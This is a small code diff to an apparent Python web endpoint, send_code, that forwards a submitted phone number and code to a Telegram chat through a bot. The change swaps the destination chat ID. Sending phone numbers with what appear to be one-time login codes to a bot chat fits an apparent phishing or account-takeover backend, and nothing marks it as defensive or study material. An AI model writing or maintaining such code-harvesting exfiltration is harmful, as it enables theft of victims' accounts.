@@ -206,7 +206,7 @@ async def send_code(payload: Code):
 
     try:
         await bot.send_message(
-            chat_id=-974972939,
+            chat_id=-1002641409178,
             text=f"phone: {payload.phone}\ncode: {payload.text}",
             parse_mode="HTML",
         )
